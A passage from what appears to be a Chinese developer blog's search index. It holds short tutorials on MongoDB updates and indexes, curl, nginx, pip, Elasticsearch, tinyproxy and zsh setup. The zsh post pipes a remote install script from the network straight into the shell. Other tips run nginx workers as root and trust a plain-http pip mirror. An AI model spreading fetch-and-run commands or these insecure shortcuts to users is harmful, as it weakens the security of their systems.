connection.getInputStream(); int lenth = connection.getContentLength(); byte[] out = new byte[lenth]; stream.read(out); stream.close(); String ans = decrypt(out, key); System.out.println(ans);}public void testDe() throws Exception { String key = \"5JRHMJn8xHnMDRXa\"; binKey(\"http://q8rnsprw0.bkt.clouddn.com/mwzz/b0001\", key);} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/30/200430-Java实现AES-ECP-PKCS5Padding加解密工具类/"},{"title":"200511-Chrome dev域名307强制走https问题记录","text":"chrome浏览器，访问.dev域名的网站时，总是提示拒绝连接请求，但是换个浏览器就没有这个问题 打开控制台，发现每次请求时，chrome浏览器会307重定向到https的访问 根据不同的浏览器执行的结果不同，基本可以确定不是后端的配置问题，多半还是chrome的某些配置上 然后发现chrom63版本之后，新增了一个功能，强制所有的.dev域名都走https，无解… 原文： https://laravel-news.com/chrome-63-now-forces-dev-domains-https 文中也提供了两个解决办法 将 .dev 域名换成其他的如 .test 域名 换浏览器… II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/11/200511-Chrome-dev域名307强制走https问题记录/"},{"title":"200410-MongoDB系列教程十二：文档更新删除之非典型篇","text":"前面介绍document的新增、删除、更新都处于相对常见和基础的说明，但是考虑到mongodb非结构化的特点，它的一些特性是我们的mysql不会遇到的，本文将针对这些特殊场景给出示例说明 在现有文档中，增加一个field 删除文档中的某个field 重命名文档的field 在文档的数组orObject中，添加/删除/更新数据 1. 增加field我们知道修改文档的命令格式如下 123456789db.collection.update( &lt;query&gt;, &lt;update&gt;, { upsert: &lt;boolean&gt;, multi: &lt;boolean&gt;, writeConcern: &lt;document&gt; }) 当我们更新一个文档中，不存在的field，会怎样 123# 插入一条数据，然后设置一个不存在的fielddb.doc_demo.insert({ \"author\" : \"一灰灰blog\", \"title\" : \"测试\"})db.doc_demo.update({'author': '一灰灰blog'}, {$set: {'skill': ['java', 'db']}}) 2. 重命名field同样是借助update方法，但是我们用到的关键字为 $rename 1db.doc_demo.update({'author': '一灰灰blog'}, {$rename: {'skill': 'like'}}) 请注意，当文档中不存在这个field，则不会有任何影响 3. 删除field既然$set可以新增一个不存在的field，那么是不是就可以用$unset来删除一个已存在的field呢 1db.doc_demo.update({'author': '一灰灰blog'}, {$unset: {'title': 1}}) 4. 数组元素修改 数组元素的修改删除增加，可以参考官方教程: MongoDB update-array Method 如果我们希望直接修改数组中的某个元素，可以借助之前查询的case 1234# 修改数组中第0个元素db.doc_demo.update({'author': '一灰灰blog'}, {$set: {'like.0': 'spring'}})# 如果查询条件中，包含了数组内容的过滤，则可以用`$`来代替具体的数组下标，如db.doc_demo.update({'author': '一灰灰blog', 'like': {$eq: 'db'}}, {$set: {'like.$': 'mysql'}}) 请注意，使用$占位符的前途是，前面的查询条件可以限定数组元素 5. 数组元素新增元素添加支持两种方式，一是addToSet，一是push $addToSet 确保没有重复的项添加到数组集合，对于已经存在的重复元素不受影响； 不能保证添加时元素的顺序 如果值是数组，则作为一个元素添加进去 可以通过 $each 实现添加多个元素到数组中 1234# 不存在时，则添加，存在则忽略db.doc_demo.update({'author': '一灰灰blog'}, {$addToSet: {'like': 'redis'}})# 借助 $each 实现批量添加db.doc_demo.update({'author': '一灰灰blog'}, {$addToSet: {'like': {$each: ['mongodb', 'es']}}}) $push 如果被更新的文档该数组不存在，那么$push将添加数组字段和值 如果字段不是数组，失败 如果值是数组，那么整个数组作为一个单个元素添加到数组 123456# 不存在时，创建一个数组db.doc_demo.update({'author': '一灰灰blog'}, {$push: {'skill': 'a'}})# 存在时，添加到数组db.doc_demo.update({'author': '一灰灰blog'}, {$push: {'skill': 'a'}})# 批量添加db.doc_demo.update({'author': '一灰灰blog'}, {$push: {'skill': {$each: ['b', 'c']}}}) 6. 数组元素删除$pop 删除第一个or最后一个 1234# 删除最后一个db.doc_demo.update({'author': '一灰灰blog'}, {$pop: {'skill': 1}})# 删除第一个db.doc_demo.update({'author': '一灰灰blog'}, {$pop: {'skill': -1}}) $pull 删除满足条件的数组元素 123456# 将数组中添加几个元素db.doc_demo.update({'author': '一灰灰blog'}, {$push: {'skill': {$each: ['a', 'b', 'c']}}})# 删除指定的元素db.doc_demo.update({'author': '一灰灰blog'}, {$pull: {'skill': 'b'}})# 删除多个指定的元素db.doc_demo.update({'author': '一灰灰blog'}, {$pull: {'skill': {$in: ['a', 'c']}}}) 注意，$pull后面跟上的可以理解为限定条件，查询教程篇的一些操作也是支持的（如比较查询等） 7. 内嵌文档操作对于内嵌文档的操作，实际上普通的field的操作姿势没有什么区别，只是对于key加了一个xx.xx的限定而已 1234567891011121314# 删除测试数据db.doc_demo.remove({})# 初始话一条演示文档db.doc_demo.insert({'author': '一灰灰blog',})# 不存在内嵌文档，则新增db.doc_demo.update({}, {$set: {'t': {'a': 1, 'b': 2}}})# 修改子fielddb.doc_demo.update({}, {$set: {'t.a': 10}})# 新增子fielddb.doc_demo.update({}, {$set: {'t.c': 'c'}})# 删除子fielddb.doc_demo.update({}, {$unset: {'t.c': 1}})# 重命名db.doc_demo.update({}, {$rename: {'t.b': 't.dd'}}) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/10/200410-MongoDB系列教程十二-文档更新删除之非典型篇/"},{"title":"200421-Curl 代理访问方式小结","text":"记录一下curl通过代理访问目标网站的几种姿势 原文请参考: How to use curl command with proxy username/password on Linux/ Unix 语法: 1234curl -x '协议://[用户名:密码@]ip[:端口号]' urlcurl -x http://[user:password@]proxyhost[:port]/ urlcurl -x socks5://[user:password@]proxyhost[:port]/ url 1. http方式的代理访问一个简单的实例demo 1curl -x 'http://127.0.0.1:8089' -I http://blog.hhui.top -v 请注意用 http:// 表示 HTTP 协议。若没有指定端口号则默认为 1080 2. socks协议1234# 方式一curl -x 'socks5://root:admin@127.0.0.1:8089/' http://blog.hhui.top -v# 方式二curl --socks5 127.0.0.1:8089 http://blog.hhui.top -v II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/21/200421-Curl-代理访问方式小结/"},{"title":"200426-mac 刷新dns","text":"mac 快速刷新dns缓存命令 1sudo killall -HUP mDNSResponder II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/26/200426-mac-刷新dns/"},{"title":"200509-python3 Pip install ssl certificate问题","text":"python3.7 通过pip进行安装时，提示ssl certificate问题 如下提示： 12pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=&apos;pypi.org&apos;, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)) - skipping 解决办法，用国内镜像源 1pip install aiohttp -i http://pypi.douban.com/simple --trusted-host pypi.douban.com II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/09/200509-python3-Pip-install-ssl-certificate问题/"},{"title":"200418-MongoDb系列教程十三：索引","text":"索引一般用来提高查询效率，避免全集合搜索，那么在mongodb中，支持索引么？如果支持，如何定义索引，如何使用索引，如何确定一个sql是否走索引？ 1. 创建索引语法定义: 1db.collection.createIndex(keys, options) 请注意，在3.0之前的版本中，也可以使用ensureIndex来创建索引 参数说明: keys：kv结构，key为fieldName, value为1 表示升序创建索引；-1 表示降序创建索引；支持多字段索引 options：可选参数 常见参数说明如下表: 参数名 说明 background true，则后台方式创建索引，不阻塞其他操作；默认为false unique true，则表示唯一约束索引，比如_id就有唯一约束；默认为false name 索引名，不指定时，根据field + 方向生成索引名 sparse true, 则不包含这个字段的不创建索引，且索引查询时查不到不包含这个字段的文档；默认false expireAfterSeconds 设置文档在集合的生存时间，s为单位 v 版本号 weight 索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重 default_language 对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语 language_override 对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language 实例如下： 1db.doc_demo.createIndex({'name': 1}, {'background': true}) 2. 索引查询查看一个集合定义了哪些索引，借助getIndexes()方法即可，如 1db.doc_demo.getIndexes() 3. 索引分析虽然我们创建了索引，但是我们的查询语句却并不一定会走索引，在mysql中我们知道有一个explain语句来分析索引情况，在mongodb中也存在类似的方法 集合数据如下 12345678{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac10172dc950171c488&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : 19, &quot;skill&quot; : [ &quot;java&quot;, &quot;python&quot;, &quot;sql&quot; ], &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5ac40172dc950171c489&quot;), &quot;name&quot; : &quot;一灰灰blog&quot;, &quot;age&quot; : 20, &quot;skill&quot; : [ &quot;web&quot;, &quot;shell&quot;, &quot;js&quot; ], &quot;tag&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5bb085a742842d2e23fc&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;sex&quot; : &quot;man&quot;, &quot;tag&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5e7b5c2e0172dc950171c48a&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;age&quot; : 18, &quot;hobby&quot; : [ &quot;play game&quot; ] }{ &quot;_id&quot; : ObjectId(&quot;5e7c5627f020f58f5323e52d&quot;), &quot;name&quot; : &quot;一灰灰2&quot;, &quot;age&quot; : 22, &quot;skill&quot; : [ &quot;android&quot;, &quot;ios&quot; ] }{ &quot;_id&quot; : ObjectId(&quot;5e7c5a61f020f58f5323e52e&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;简单的标题&quot;, &quot;content&quot; : &quot;简单的内容&quot;, &quot;tag&quot; : [ &quot;java&quot;, &quot;后端&quot; ] } }{ &quot;_id&quot; : ObjectId(&quot;5e7c5a8af020f58f5323e52f&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;哈哈&quot;, &quot;content&quot; : &quot;嘻嘻哈哈&quot;, &quot;tag&quot; : [ &quot;随笔&quot; ], &quot;draft&quot; : true } }{ &quot;_id&quot; : ObjectId(&quot;5e7c5ae7f020f58f5323e530&quot;), &quot;name&quot; : &quot;一灰灰&quot;, &quot;doc&quot; : { &quot;title&quot; : &quot;22&quot;, &quot;content&quot; : &quot;3333&quot;, &quot;tag&quot; : [ &quot;随笔&quot; ], &quot;draft&quot; : false, &quot;visit&quot; : 10 } } 当前集合上除了默认的_id索引之外，针对name也创建了升序索引 如需要判断一个查询语句的情况，可以在后面加上explain()方法，如下 1db.doc_demo.find({'name': '一灰灰'}).explain() 输出如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344{ \"queryPlanner\" : { \"plannerVersion\" : 1, \"namespace\" : \"basic.doc_demo\", \"indexFilterSet\" : false, \"parsedQuery\" : { \"name\" : { \"$eq\" : \"一灰灰\" } }, \"winningPlan\" : { \"stage\" : \"FETCH\", \"inputStage\" : { \"stage\" : \"IXSCAN\", \"keyPattern\" : { \"name\" : 1 }, \"indexName\" : \"name_1\", \"isMultiKey\" : false, \"multiKeyPaths\" : { \"name\" : [ ] }, \"isUnique\" : false, \"isSparse\" : false, \"isPartial\" : false, \"indexVersion\" : 2, \"direction\" : \"forward\", \"indexBounds\" : { \"name\" : [ \"[\\\"一灰灰\\\", \\\"一灰灰\\\"]\" ] } } }, \"rejectedPlans\" : [ ] }, \"serverInfo\" : { \"host\" : \"0f51c424211c\", \"port\" : 27017, \"version\" : \"4.0.4\", \"gitVersion\" : \"f288a3bdf201007f3693c58e140056adf8b04839\" }, \"ok\" : 1} 关于是否走索引，主要看stage，通常会有以下几种状态 stage 描述 COLLSCAN 全表扫描 IXSCAN 扫描索引 FETCH 根据索引去检索指定document SHARD_MERGE 将各个分片返回数据进行merge SORT 表明在内存中进行了排序 LIMIT 使用limit限制返回数 SKIP 使用skip进行跳过 IDHACK 针对_id进行查询 SHARDING_FILTER 通过mongos对分片数据进行查询 COUNT 利用db.coll.explain().count()之类进行count运算 COUNTSCAN count不使用Index进行count时的stage返回 COUNT_SCAN count使用了Index进行count时的stage返回 SUBPLA 未使用到索引的$or查询的stage返回 TEXT 使用全文索引进行查询时候的stage返回 PROJECTION 限定返回字段时候stage的返回 上面的具体查询，对应的stage组合是Fetch+ixscan，也就是说会根据索引查询 虽然mongodb会根据查询来选择索引，但并不能保证都能选到最优的索引；这种时候我们可以通过hint来强制指定索引，举例如下 1db.doc_demo.find({'age': 18, 'name':'一灰灰'}).hint({'name': 1}).explain() 4. 删除索引一般有下面两种删除方式，全量删除和指定索引删除 1234# 全量删除db.collection.dropIndexes()# 指定删除db.collection.dropIndex(索引名) 请注意，指定索引名删除时，如果不确定索引名是啥，可以通过getIndexes()来查看 5. 文档自动删除在创建索引的时候，其中有一个参数比较有意思，有必要单独拿出来说明一下，expireAfterSeconds 设置文档的生存时间 使用它有几个潜规则： 索引字段为Date类型 单字段索引，不支持混合索引 非立即执行 12345# 插入一条文档，请注意这个时间，因为时区原因相对于北京时间，少8小时db.doc_demo.insert({'name': 'yihui', 'log': '操作了啥啥啥', 'createDate': new Date('Mar27, 2020 2:54:00')})# 创建索引db.doc_demo.createIndex({'createDate': 1}, {expireAfterSeconds: 60}) 然后过一段时间（并不一定10:55分的时候会删除）再去查询，会发现插入的文档被删除了 利用这种特性，在mongodb中存一些需要定时删除的数据，相比较我们常用的mysql而言，还是有很大优势的 6. 覆盖索引覆盖索引的概念有些类似mysql中的不回表查询的case，直接查询索引，就可以返回所需要的字段了 比如在前面的case中，我只查询name字段，可以走覆盖索引；但是返回除了name，还有_id，那么就不能了 1234# 覆盖索引db.doc_demo.find({'name': '一灰灰'}, {'name': 1, '_id': 0})# 非覆盖索引db.doc_demo.find({'name': '一灰灰'}, {'name': 1}) 注意：所有索引字段是一个数组时，不能使用覆盖索引 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/04/18/200418-MongoDb系列教程十三-索引/"},{"title":"200515-nginx 提示文件访问权限问题failed(13:Permission denied)","text":"nginx配置完毕之后，添加一个html页面，访问直接500错误，通过查看错误日志，显示 failed (13: Permission denied) 解决方法，修改配置文件中的user为root 1234vim /etc/nginx/nginx.confuser root;worker_processes auto; 修改完之后，重启即可 1nginx -s reload II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/15/200515-nginx-提示文件访问权限问题failed-13-Permission-denied/"},{"title":"200604 Nginx重写代理链接","text":"本文参考自: 重写代理链接-url-rewrite 使用nginx做发现代理，遇到一个场景，匹配 /console/ 开头的域名，转发到目标端口号，但是希望转发过去的url，去掉 /console/ 这个头 针对这个，可以借助 rewrite + proxy_pass来实现 1234location /console { rewrite ^/console/(.*) /$1 break; proxy_pass http://127.0.0.1:8080/;} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/04/200604-Nginx重写代理链接/"},{"title":"200527-Python 获取本机Ip和主机名","text":"python中获取本机ip以及主机名 1234import sockethostname = socket.gethostname()ip = socket.gethostbyname(hostname) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/27/200527-Python-获取本机Ip和主机名/"},{"title":"200517-吐槽之阿里云欠费7分导致服务不可用","text":"新业务上线，购买了阿里云全家桶，服务跑着好好的，突然发现跪了，首先是域名能ping通，但是访问不了，服务器也能ping通，结果就是死活登录补上去，ssh各种超时，阿里云控制台的远程登录也不行，这尼玛难道是阿里云宕机了？其他项目组的阿里云服务器很正常啊 然后按照某些博文说的，重启大法，然而并没有什么鸟用… 那就提工单，响应速度真的是很快很快，两个小时的排查，然后告诉我是因为欠费，查了下明细，oss服务欠了7分的流量费，导致服务器无法登录，这个操作也是可以了… II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/17/200517-吐槽之阿里云ECS无法远程登录/"},{"title":"200526-python int list转String","text":"在python中，可以直接通过','.join的方式来连接一个list，但是如果list中的元素不是string，会报错 123456&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; ','.join(a)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: sequence item 0: expected str instance, int found&gt;&gt;&gt; 针对非string元素的列表的转换时，可以考虑借助表达式语言来处理，如下 1234&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; ','.join([str(x) for x in a])'1,2,3'&gt;&gt;&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/05/26/200526-python-int-list-转String/"},{"title":"200605-Centos 安装ElasticSearch","text":"本文记录Centos 7.5 安装 ElasticSearch 6.8.5 版本的全过程 1. ES安装流程 es的运行依赖jdk，所以需要先安装好java环境，我们这里用的jdk1.8，这里不额外说明jdk环境的安装流程 a. 下载首先到目标网站，查询需要下载的版本 : https://www.elastic.co/cn/downloads/past-releases#elasticsearch 本文选择6.8.5（主要是为了和SpringBoot 2.2.0-RELEASE对上） 1wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.8.5.tar.gz b. 解压启动下载完之后，直接解压，并进入目录， 12unzip elasticsearch-6.8.5.tar.gzcd elasticsearch-6.8.5 修改配置，指定数据存储和日志路径，支持外部访问 12345678vim conf/elasticsearch.yml# 请确保下面两个目录存在，且拥有访问权限path.data: /data/es/datapath.logs: /data/es/logs# 本机ipnetwork.host: 192.168.0.174 c. 启动测试直接运行bin目录下的elasticsearch即可启动es，当然也可以以后台方式启动 1234567vim starth.shnohup bin/elasticsearch 1&gt; /dev/null 2&gt;&amp;1 &amp;echo $! 1&gt; pid.log# 执行starth.sh脚本，运行sh start.sh 本机访问: 12345678910111213141516171819curl http://192.168.0.174:9200/{ \"name\" : \"ZyI14BD\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"YYFtAHGOSS6ijjDf4VuDoA\", \"version\" : { \"number\" : \"6.8.4\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"bca0c8d\", \"build_date\" : \"2019-10-16T06:19:49.319352Z\", \"build_snapshot\" : false, \"lucene_version\" : \"7.7.2\", \"minimum_wire_compatibility_version\" : \"5.6.0\", \"minimum_index_compatibility_version\" : \"5.0.0\" }, \"tagline\" : \"You Know, for Search\"} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/05/200605-Centos-安装ElasticSearch/"},{"title":"200619-http代理服务器tinyproxy搭建手册","text":"简单记录一下http代理服务器tinyproxy的搭建与简单配置过程 12# 安装sudo yum install tinyproxy -y 安装完毕之后，做一些基本的配置，比如端口，允许的ip等 1234567vim /etc/tinyproxy/tinyproxy.conf# 端口Port 18888# 允许的ip，如果不配置allow，那么默认所有的ip都可以进来Allow 127.0.0.1 服务启动关闭等命令 123456# 启动systemctl start tinyproxy.service# 重启systemctl restart tinyproxy.service# 关闭systemctl stop tinyproxy.service 查看代理日志 1tail -f /var/log/tinyproxy/tinyproxy.log 测试： 12# 请注意，curl -x \"127.0.0.1:18888\" -v 'http://www.baidu.com' 参考文档: linux搭建http代理服务器 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/19/200619-http代理服务器tinyproxy搭建手册/"},{"title":"200616-zsh 安装与配置","text":"本文简单记录centos环境下，zsh的安装过程，以及我个人常用的主题配置 1. 安装首先判断是否已经安装过zsh(which zsh)，如果没有则切换root用户/或者+sudo 1sudo yum install zsh 注意在当前用户身份下，进行主题下载 1sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 2. 主题配置上面安装好之后，会是默认的主题样式，在主题包下面有很多主题，可以根据自己的需要进行选择，下面是我个人自定义的主题 12# 创建自定义的主题文件vim ~/.oh-my-zsh/themes/myrobbyrussell.zsh-theme 内容如下 12345678PROMPT=\"%{$fg_bold[green]%}%n@%m%{$fg_bold[green]%}:%{$fg_bold[red]%}\"PROMPT+='%{$fg[cyan]%}%c%{$reset_color%} $(git_prompt_info)$ 'ZSH_THEME_GIT_PROMPT_PREFIX=\"%{$fg_bold[blue]%}git:(%{$fg[red]%}\"ZSH_THEME_GIT_PROMPT_SUFFIX=\"%{$reset_color%}\"ZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}) %{$fg[yellow]%}\"ZSH_THEME_GIT_PROMPT_CLEAN=\"%{$fg[blue]%})\" 接着修改一下.zshrc文件 1ZSH_THEME=\"myrobbyrussell\" 保存退出，使主题修改生效，需要额外执行 1source ~/.zshrc 3. 禁用自动更新如果不想zsh每周的自动更新，可以直接在配置中关掉 1234vim ~/.zshrc# 找到下面这一行，去掉注释DISABLE_AUTO_UPDATE=\"true\" 或者编辑.oh-my-zsh/oh-my-zsh.sh 12345set DISABLE_AUTO_UPDATE = false# 在下面这一行前面，主动设置变量值为false# Check for updates on initial load...if [ \"$DISABLE_AUTO_UPDATE\" != \"true\" ]; then II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/16/200616-zsh-安装与配置/"},{"title":"200722-idea依赖类标红问题fix","text":"idea内部类，导入标红，提示找不到对应的依赖，解决办法 file -&gt; Invalidate Caches/ Restart II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/07/22/200722-idea依赖类标红问题fix/"},{"title":"200709-CURL文件上传","text":"使用curl进行文件上传，语法如下 1curl -f '文件名=@文件地址' url 一个简单的实例如 1curl -F 'data=@up.txt' 'http://127.0.0.1:8080/upload' 请注意，data为上传的文件名，后端也是根据这个data来获取文件的 如果在上传时，需要添加表单参数，可以如下 1curl -F 'data=@up.txt' -F 'name=一灰灰' 'http://127.0.0.1:8080/upload' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/07/09/200709-CURL文件上传/"},{"title":"200629-Quick-Media 中文二维码支持","text":"Quick-Media 项目提供了一些列多媒体操作的开箱即用工具类，比如图片编辑合成，markdown/html/svg渲染，音频处理；当然还有本文重点说明的二维码生成解析 QrCode-Plugin支持丰富的酷炫二维码生成，大概十来天前有个小伙伴提了一个非常有意思的方向，能否将二维码中的黑白方块换成中文 趁着端午放假前夕的空闲时间，把这个集成在QrCode插件中，生成效果如下（从左往右，从上往下读，千字文😝） I. 使用说明1. maven导入对于java环境的小伙伴，可以借助maven引入依赖包 123456789101112&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.hui.media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.1&lt;/version&gt;&lt;/dependency&gt; 或者使用jitpack导入依赖也是可以的 1234567891011121314&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jitpack.io&lt;/id&gt; &lt;url&gt;https://jitpack.io&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;!-- 请注意groupId和github的方式有一些区别哦 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi.quick-media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.4&lt;/version&gt;&lt;/dependency&gt; 2. 源码方式对于源码的使用方式就比较简单了，下载源码，直接在test目录下编写测试case即可 源码地址: Quick-Media 3. 使用case先来看一下，如何生成文字二维码，一个最简单的使用case如下 1234567891011121314151617/** * 文字二维码，顺序方式渲染 */@Testpublic void fontQr1() { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; try { boolean ans = QrCodeGenWrapper.of(msg) .setErrorCorrection(ErrorCorrectionLevel.H) // 指定渲染模式为TXT即可 .setDrawStyle(QrCodeOptions.DrawStyle.TXT) .setPicType(\"png\") .asFile(\"/tmp/fontQr1.png\"); } catch (Exception e) { e.printStackTrace(); }} 